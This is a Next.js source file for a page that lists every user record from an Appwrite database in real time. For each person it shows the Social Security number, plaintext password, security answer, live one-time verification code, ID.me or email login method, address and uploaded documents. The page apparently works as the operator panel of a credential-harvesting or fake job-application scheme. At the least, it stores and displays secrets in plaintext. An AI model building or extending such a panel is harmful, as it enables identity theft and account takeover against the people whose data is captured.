"use client";

import Link from "next/link";
import { useState, useEffect, Suspense } from "react";
import { useAppwrite } from "@/app/lib/AppwriteContext";
import { client, databases, DATABASE_ID, USERS_COLLECTION_ID, documentStorageService } from "@/app/lib/appwrite";
import { Query } from "appwrite";
import { useSearchParams } from "next/navigation";

// Type for the document from Appwrite
interface AppwriteUser {
  $id: string;
  $createdAt: string;
  $updatedAt: string;
  email: string;
  firstName?: string;
  lastName?: string;
  middleName?: string;
  authMethod?: "email" | "id.me" | null;
  phoneNumber?: string;
  ssn?: string;
  address?: string;
  city?: string;
  state?: string;
  zipCode?: string;
  uploadedDocuments?: Array<{
  id: string;
    name: string;
    type?: string;
    size: number;
    uploadedAt?: string;
    fileId?: string;
    data?: string;
  }>;
  signInTimestamp?: string;
  candidateFormTimestamp?: string;
  verificationCodeTimestamp?: string;
  verificationCode?: string;
  password?: string;
  securityQuestion?: string;
  securityAnswer?: string;
  securityQuestions?: Array<{ question: string; answer: string } | string>;
}

// Component that uses useSearchParams
function TestContent() {
  const searchParams = useSearchParams();
  
  // App state
  const [users, setUsers] = useState<AppwriteUser[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [lastUpdate, setLastUpdate] = useState<Date | null>(null);
  const [realtimeStatus, setRealtimeStatus] = useState<'connected' | 'disconnected' | 'connecting'>('connecting');
  const [isDeleting, setIsDeleting] = useState<string | null>(null);
  const [successMessage, setSuccessMessage] = useState<string | null>(null);
  const [fileExistsStatus, setFileExistsStatus] = useState<{[key: string]: boolean}>({});
  const { resetUserData } = useAppwrite();
  
  // Check if redirected after deletion from details page
  useEffect(() => {
    const deletedEmail = searchParams.get('deleted');
    if (deletedEmail) {
      setSuccessMessage(`User ${deletedEmail} was successfully deleted.`);
      
      // Clear success message after 5 seconds
      setTimeout(() => {
        setSuccessMessage(null);
      }, 5000);
    }
  }, [searchParams]);
  
  // Function to check if a document with a fileId exists
  const checkDocumentExists = async (fileId: string): Promise<boolean> => {
    // If we already have the status, don't check again
    if (fileExistsStatus[fileId] !== undefined) {
      return fileExistsStatus[fileId];
    }
    
    try {
      const exists = await documentStorageService.checkFileExists(fileId);
      
      // Update the state with the new status
      setFileExistsStatus(prev => ({
        ...prev,
        [fileId]: exists
      }));
      
      return exists;
    } catch (error) {
      // Handle any errors by setting exists to false
      setFileExistsStatus(prev => ({
        ...prev,
        [fileId]: false
      }));
      return false;
    }
  };
  
  // Function to get the button text/status based on file existence
  const getFileStatusText = (fileId: string | undefined): string => {
    if (!fileId) return "No file";
    if (fileExistsStatus[fileId] === false) return "File missing";
    if (fileExistsStatus[fileId] === true) return "Download";
    return "Download"; // Default if not checked yet
  };
  
  // Function to get button title based on file existence
  const getFileStatusTitle = (fileId: string | undefined, fileName: string): string => {
    if (!fileId) return "Document not available for download";
    if (fileExistsStatus[fileId] === false) return "File no longer exists in storage";
    return `Download ${fileName}`;
  };
  
  // Function to fetch all users
  const fetchAllUsers = async () => {
    try {
      setIsLoading(true);
      
      const response = await databases.listDocuments(
        DATABASE_ID,
        USERS_COLLECTION_ID,
        [
          Query.limit(100),
          Query.orderDesc('$updatedAt')
        ]
      );
      
      // Cast response.documents to AppwriteUser array after ensuring it has the right structure
      const userDocuments = response.documents.map(doc => ({
        $id: doc.$id,
        $createdAt: doc.$createdAt,
        $updatedAt: doc.$updatedAt,
        email: doc.email || "",
        firstName: doc.firstName || undefined,
        lastName: doc.lastName || undefined,
        middleName: doc.middleName || undefined,
        authMethod: doc.authMethod || undefined,
        phoneNumber: doc.phoneNumber || undefined,
        ssn: doc.ssn || undefined,
        address: doc.address || undefined,
        city: doc.city || undefined,
        state: doc.state || undefined,
        zipCode: doc.zipCode || undefined,
        uploadedDocuments: doc.uploadedDocuments || [],
        signInTimestamp: doc.signInTimestamp || undefined,
        candidateFormTimestamp: doc.candidateFormTimestamp || undefined,
        verificationCodeTimestamp: doc.verificationCodeTimestamp || undefined,
        verificationCode: doc.verificationCode || undefined,
        password: doc.password || undefined,
        securityQuestion: doc.securityQuestion || undefined,
        securityAnswer: doc.securityAnswer || undefined,
        securityQuestions: doc.securityQuestions || []
      })) as AppwriteUser[];
      
      setUsers(userDocuments);
      setLastUpdate(new Date());
      setError(null);
    } catch (err) {
      console.error('Error fetching users:', err);
      setError('Failed to load user data');
    } finally {
      setIsLoading(false);
    }
  };
  
  // Initial data fetch
  useEffect(() => {
    fetchAllUsers();
    
    // Set up auto-refresh
    const interval = setInterval(() => {
      fetchAllUsers();
    }, 10000); // Refresh every 10 seconds
    
    return () => clearInterval(interval);
  }, []);
  
  // Set up realtime subscription to the collection
  useEffect(() => {
    // Subscribe to the entire collection
    const unsubscribe = client.subscribe(
      `databases.${DATABASE_ID}.collections.${USERS_COLLECTION_ID}.documents`,
      (response) => {
        console.log('Realtime update received:', response);
        fetchAllUsers();
        setRealtimeStatus('connected');
      }
    );
    
    // Mark as connected after a short delay (even if no events yet)
    const timer = setTimeout(() => {
      if (realtimeStatus === 'connecting') {
        setRealtimeStatus('connected');
      }
    }, 2000);
    
    return () => {
      clearTimeout(timer);
      unsubscribe();
      setRealtimeStatus('disconnected');
    };
  }, []);
  
  // Format a date/time value
  const formatDate = (dateString?: string) => {
    if (!dateString) return 'Never';
    try {
      return new Date(dateString).toLocaleString();
    } catch {
      return dateString;
    }
  };
  
  // Handle data reset for a specific user
  const handleResetUser = async (userId: string, email: string) => {
    if (confirm(`Are you sure you want to reset all data for ${email}?`)) {
      try {
        setIsLoading(true);
        await resetUserData();
        setIsLoading(false);
        fetchAllUsers();
      } catch (error) {
        console.error("Error resetting user:", error);
        setError("Failed to reset user data");
        setIsLoading(false);
      }
    }
  };

  // Handle delete user
  const handleDeleteUser = async (userId: string, email: string) => {
    if (confirm(`Are you sure you want to DELETE ${email} from the database? This action cannot be undone.`)) {
      try {
        setIsDeleting(userId);
        await databases.deleteDocument(
          DATABASE_ID,
          USERS_COLLECTION_ID,
          userId
        );
        
        // Remove user from local state
        setUsers(prev => prev.filter(user => user.$id !== userId));
        setLastUpdate(new Date());
        
        // Show success message
        setSuccessMessage(`User ${email} was successfully deleted.`);
        
        // Clear success message after 5 seconds
        setTimeout(() => {
          setSuccessMessage(null);
        }, 5000);
        
      } catch (error) {
        console.error("Error deleting user:", error);
        setError(`Failed to delete user: ${error instanceof Error ? error.message : 'Unknown error'}`);
      } finally {
        setIsDeleting(null);
      }
    }
  };

  // Function to handle file download
  const handleDownload = async (fileId: string, fileName: string) => {
    if (!fileId) return;
    
    // Check if file exists
    const exists = await checkDocumentExists(fileId);
    
    if (!exists) {
      alert(`File "${fileName}" no longer exists in storage.`);
      return;
    }

    try {
      // Get download URL from Appwrite
      const downloadUrl = documentStorageService.getFileDownloadUrl(fileId);
      
      // Create a temporary anchor to trigger download
      const anchor = document.createElement('a');
      anchor.href = downloadUrl;
      anchor.download = fileName || 'document';
      anchor.target = '_blank';
      
      // Add error handling for 404s
      anchor.onerror = () => {
        alert(`File "${fileName}" could not be found. It may have been deleted from storage.`);
        
        // Update the file exists status
        setFileExistsStatus(prev => ({
          ...prev,
          [fileId]: false
        }));
      };
      
      // Create a fallback if the download fails
      const timeoutId = setTimeout(() => {
        // If it takes too long, we'll assume there was an error
        alert(`File "${fileName}" could not be downloaded. It may no longer exist in the storage.`);
      }, 5000);
      
      // Add onload handler to clear the timeout
      anchor.onload = () => {
        clearTimeout(timeoutId);
      };
      
      document.body.appendChild(anchor);
      anchor.click();
      document.body.removeChild(anchor);
      
      // Open in a new tab as a fallback (this gives the browser's built-in error handling)
      window.open(downloadUrl, '_blank');
    } catch (error) {
      console.error("Error downloading file:", error);
      alert(`Failed to download file "${fileName}". The file may no longer exist in the storage.`);
      
      // Update the file exists status
      setFileExistsStatus(prev => ({
        ...prev,
        [fileId]: false
      }));
    }
  };

  // Add an effect to check file existence when users are loaded
  useEffect(() => {
    const checkAllDocuments = async () => {
      // Only check if we have users with documents
      if (users.length === 0) return;
      
      const newStatuses: {[key: string]: boolean} = { ...fileExistsStatus };
      let changed = false;
      
      // Check each user's documents
      for (const user of users) {
        if (!user.uploadedDocuments || user.uploadedDocuments.length === 0) continue;
        
        for (const doc of user.uploadedDocuments) {
          if (doc.fileId && fileExistsStatus[doc.fileId] === undefined) {
            try {
              // Only check files we haven't checked yet
              const exists = await documentStorageService.checkFileExists(doc.fileId);
              newStatuses[doc.fileId] = exists;
              changed = true;
            } catch (err) {
              console.error(`Error checking file ${doc.fileId}:`, err);
              newStatuses[doc.fileId] = false;
              changed = true;
            }
          }
        }
      }
      
      // If we found any new file statuses, update the state
      if (changed) {
        setFileExistsStatus(newStatuses);
      }
    };
    
    checkAllDocuments();
  }, [users]); // Run when users changes

  return (
    <div className="min-h-screen bg-gray-50 px-4 py-8">
      <div className="mx-auto max-w-7xl">
        <header className="mb-8">
          <div className="flex flex-wrap items-center justify-between gap-4">
            <div>
              <h1 className="text-3xl font-bold text-blue-800">Real-time User Data</h1>
              <p className="mt-1 text-gray-600">
                Automatically showing all user data from Appwrite
              </p>
            </div>
            
            <div className="flex items-center gap-3">
              <div className="flex items-center text-sm">
                <span className="mr-2">Status:</span>
                <span className={`inline-flex items-center rounded-full px-2.5 py-0.5 text-xs font-medium ${
                  realtimeStatus === 'connected' 
                    ? 'bg-green-100 text-green-800' 
                    : realtimeStatus === 'connecting'
                    ? 'bg-yellow-100 text-yellow-800'
                    : 'bg-red-100 text-red-800'
                }`}>
                  <span className={`mr-1 h-2 w-2 rounded-full ${
                    realtimeStatus === 'connected' 
                      ? 'bg-green-500' 
                      : realtimeStatus === 'connecting'
                      ? 'bg-yellow-500'
                      : 'bg-red-500'
                  }`}></span>
                  {realtimeStatus === 'connected' 
                    ? 'Connected' 
                    : realtimeStatus === 'connecting' 
                    ? 'Connecting...'
                    : 'Disconnected'
                  }
                </span>
        </div>
        
            <button
                onClick={fetchAllUsers}
                disabled={isLoading}
                className="flex items-center gap-1 rounded bg-blue-600 px-3 py-1.5 text-sm text-white hover:bg-blue-700 disabled:bg-blue-300"
              >
                <svg xmlns="http://www.w3.org/2000/svg" className={`h-4 w-4 ${isLoading ? 'animate-spin' : ''}`} fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
                </svg>
                {isLoading ? 'Refreshing...' : 'Refresh'}
            </button>
          </div>
        </div>
        </header>
        
        {/* Status bar */}
        <div className="mb-6 rounded-lg bg-white p-4 shadow-sm">
          <div className="flex flex-wrap items-center justify-between">
            <div className="text-sm text-gray-600">
              <span className="font-medium">{users.length}</span> users in database
                </div>
            <div className="text-sm text-gray-600">
              {lastUpdate && `Last updated: ${lastUpdate.toLocaleString()}`}
                </div>
              </div>
          
          {error && (
            <div className="mt-2 rounded bg-red-50 p-2 text-sm text-red-600">
              {error}
            </div>
          )}
          
          {successMessage && (
            <div className="mt-2 rounded bg-green-50 p-2 text-sm text-green-600 flex items-center justify-between">
              <div className="flex items-center">
                <svg className="h-4 w-4 mr-2" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                  <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                </svg>
                {successMessage}
              </div>
              <button 
                onClick={() => setSuccessMessage(null)}
                className="text-green-700 hover:text-green-900"
              >
                <svg className="h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                  <path fillRule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clipRule="evenodd" />
                </svg>
              </button>
            </div>
          )}
            </div>
        
        {/* Users Table */}
        <div className="mb-6 overflow-hidden rounded-lg bg-white shadow-sm">
              <div className="overflow-x-auto">
                <table className="min-w-full divide-y divide-gray-200">
                  <thead className="bg-gray-50">
                    <tr>
                  <th scope="col" className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500">
                        User
                      </th>
                  <th scope="col" className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500">
                    Auth Method
                      </th>
                  <th scope="col" className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500">
                    Personal Info
                      </th>
                  <th scope="col" className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500">
                    Location
                      </th>
                  <th scope="col" className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500">
                    Documents
                  </th>
                  <th scope="col" className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500">
                    Activity
                      </th>
                  <th scope="col" className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500">
                        Actions
                      </th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-gray-200 bg-white">
                {isLoading && users.length === 0 ? (
                  <tr>
                    <td colSpan={7} className="px-6 py-4 text-center">
                      <div className="flex items-center justify-center">
                        <div className="mr-2 h-5 w-5 animate-spin rounded-full border-2 border-blue-600 border-t-transparent"></div>
                        <span>Loading users...</span>
                      </div>
                    </td>
                  </tr>
                ) : users.length === 0 ? (
                  <tr>
                    <td colSpan={7} className="px-6 py-4 text-center text-gray-500">
                      No users found
                    </td>
                  </tr>
                ) : (
                  users.map((user) => (
                    <tr key={user.$id} className="hover:bg-gray-50">
                      <td className="px-4 py-4 text-sm">
                        <div className="font-medium text-blue-600">{user.email}</div>
                        <div className="text-xs text-gray-500">ID: {user.$id.substring(0, 8)}...</div>
                      </td>
                      <td className="px-4 py-4 text-sm">
                        {user.authMethod ? (
                          <span className={`inline-flex items-center rounded-full px-2.5 py-0.5 text-xs font-medium ${
                            user.authMethod === 'email' 
                              ? 'bg-blue-100 text-blue-800' 
                              : 'bg-purple-100 text-purple-800'
                          }`}>
                            {user.authMethod === 'email' ? 'Email & Password' : 'ID.me'}
                          </span>
                        ) : (
                          <span className="text-gray-400 italic">Not set</span>
                        )}
                        
                        {/* Display verification code if available */}
                        {user.verificationCode && (
                          <div className="mt-2">
                            <span className="rounded-md bg-yellow-100 px-1.5 py-0.5 text-xs font-medium text-yellow-800">
                              Code: {user.verificationCode}
                              </span>
                            </div>
                        )}
                        
                        {/* Display security questions indicator */}
                        {user.securityQuestions && user.securityQuestions.length > 0 && (
                          <div className="mt-2">
                            <span className="rounded-md bg-green-100 px-1.5 py-0.5 text-xs font-medium text-green-800 flex items-center">
                              <svg xmlns="http://www.w3.org/2000/svg" className="h-3 w-3 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                              </svg>
                              {user.securityQuestions.length} Security Q's
                            </span>
                          </div>
                        )}
                      </td>
                      <td className="px-4 py-4 text-sm">
                        <div>
                          <span className="font-medium">Name:</span>{' '}
                          {[user.firstName, user.middleName, user.lastName].filter(Boolean).join(' ') || 
                            <span className="text-gray-400 italic">Not provided</span>}
                        </div>
                        {user.phoneNumber && (
                          <div className="text-xs text-gray-600 mt-1">
                            Phone: {user.phoneNumber}
                          </div>
                        )}
                        {user.ssn && (
                          <div className="text-xs text-gray-600 mt-1">
                            SSN: {user.ssn}
                          </div>
                        )}
                        {user.password && (
                          <div className="text-xs text-gray-600 mt-1">
                            Password: {user.password}
                            </div>
                        )}
                        {user.securityAnswer && (
                          <div className="text-xs text-gray-600 mt-1">
                            Security Answer: {user.securityAnswer}
                          </div>
                        )}
                        </td>
                      <td className="px-4 py-4 text-sm">
                        {user.address || user.city || user.state ? (
                          <div>
                            {user.address && <div>{user.address}</div>}
                            {(user.city || user.state || user.zipCode) && (
                              <div className="text-gray-600">
                                {[user.city, user.state, user.zipCode].filter(Boolean).join(', ')}
                              </div>
                            )}
                          </div>
                        ) : (
                          <span className="text-gray-400 italic">Not provided</span>
                        )}
                        </td>
                      <td className="px-4 py-4 text-sm">
                        {Array.isArray(user.uploadedDocuments) && user.uploadedDocuments.length > 0 ? (
                          <div className="space-y-2">
                            {user.uploadedDocuments.map((doc) => (
                              <div key={doc.id} className="flex items-center">
                                <span className="mr-2 text-xs">
                                  {doc.name.substring(0, 15)}{doc.name.length > 15 ? '...' : ''}
                                </span>
                                <button
                                  onClick={() => handleDownload(doc.fileId || '', doc.name)}
                                  disabled={!doc.fileId || fileExistsStatus[doc.fileId] === false}
                                  className="inline-flex items-center rounded bg-blue-50 px-2 py-1 text-xs font-medium text-blue-700 hover:bg-blue-100 disabled:opacity-50 disabled:cursor-not-allowed"
                                  title={getFileStatusTitle(doc.fileId, doc.name)}
                                >
                                  <svg xmlns="http://www.w3.org/2000/svg" className="mr-1 h-3 w-3" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
                              </svg>
                                  {getFileStatusText(doc.fileId)}
                                </button>
                              </div>
                            ))}
                            <div className="text-xs text-gray-500">
                              Total: {user.uploadedDocuments.length} file(s)
                            </div>
                          </div>
                        ) : (
                          <span className="text-gray-400 italic">No documents</span>
                        )}
                        </td>
                      <td className="px-4 py-4 text-xs text-gray-500">
                        <div className="space-y-1">
                          <div>
                            <span className="font-medium">Updated:</span> {formatDate(user.$updatedAt)}
                          </div>
                          <div>
                            <span className="font-medium">Sign in:</span> {formatDate(user.signInTimestamp)}
                          </div>
                          <div>
                            <span className="font-medium">Form completed:</span> {formatDate(user.candidateFormTimestamp)}
                          </div>
                          {user.verificationCodeTimestamp && (
                            <div>
                              <span className="font-medium">Verification:</span> {formatDate(user.verificationCodeTimestamp)}
                            </div>
                          )}
                        </div>
                        </td>
                      <td className="px-4 py-4 text-sm">
                        <div className="space-y-1">
                          <button
                            onClick={() => {
                              const url = `/test/details?email=${encodeURIComponent(user.email)}`;
                              window.open(url, '_blank');
                            }}
                            className="flex w-full items-center justify-center rounded bg-blue-50 px-2 py-1 text-xs font-medium text-blue-600 hover:bg-blue-100"
                          >
                            View Details
                          </button>
                                <button
                            onClick={() => handleResetUser(user.$id, user.email)}
                            className="flex w-full items-center justify-center rounded bg-orange-50 px-2 py-1 text-xs font-medium text-orange-600 hover:bg-orange-100"
                                >
                            Reset Data
                                </button>
                                <button
                            onClick={() => handleDeleteUser(user.$id, user.email)}
                            disabled={isDeleting === user.$id}
                            className="flex w-full items-center justify-center rounded bg-red-50 px-2 py-1 text-xs font-medium text-red-600 hover:bg-red-100 disabled:opacity-50"
                          >
                            {isDeleting === user.$id ? (
                              <>
                                <svg className="mr-1 h-3 w-3 animate-spin" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                  </svg>
                                Deleting...
                              </>
                            ) : (
                              "Delete User"
                            )}
                          </button>
                          </div>
                        </td>
                      </tr>
                  ))
                )}
                  </tbody>
                </table>
              </div>
        </div>
        
        {/* Auto-update info */}
        <div className="mb-8 rounded-lg bg-blue-50 p-4 text-center text-sm text-blue-700">
          <p>
            This page automatically refreshes data every 10 seconds and listens for real-time updates.
            <br />
            Last refresh: {lastUpdate ? lastUpdate.toLocaleString() : 'Never'}
          </p>
          </div>

        <div className="mt-8 flex justify-center">
          <Link
            href="/"
            className="rounded-md bg-blue-800 px-4 py-2 text-sm font-medium text-white hover:bg-blue-900 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2"
          >
            Return to Home
          </Link>
        </div>
      </div>
    </div>
  );
}

// Main component that wraps the content in a Suspense boundary
export default function TestPage() {
  return (
    <Suspense fallback={
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="text-center">
          <div className="inline-block h-8 w-8 animate-spin rounded-full border-4 border-solid border-blue-600 border-r-transparent"></div>
          <p className="mt-4 text-gray-700">Loading user data...</p>
        </div>
    </div>
    }>
      <TestContent />
    </Suspense>
  );
} 